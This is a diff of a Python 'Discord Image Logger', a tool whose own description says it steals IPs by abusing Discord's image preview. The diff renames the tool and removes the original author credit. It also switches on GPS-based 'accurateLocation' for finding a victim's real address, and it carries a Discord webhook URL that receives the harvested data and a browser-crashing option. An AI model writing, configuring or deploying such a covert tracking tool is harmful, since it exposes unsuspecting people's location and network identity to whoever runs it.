@@ -1,17 +1,14 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "imglogger"
+__description__ = "an app which abuses discord open image protocol"
+__version__ = "2"
+__author__ = "pretzel"
 
 config = {
-    # BASE CONFIG #
+    # BASE CONFIG 
     "webhook": "https://discord.com/api/webhooks/1335015826004381798/B8dn5T6ATK-SsfhNkPzacBpmaoSVHjwONp4R5PjCGJSiMcUBpFIjYNz-xFJTQG-YcxYk",
     "image": "https://images.hdqwalls.com/download/mountain-reflections-3840x2400.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
@@ -24,7 +21,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
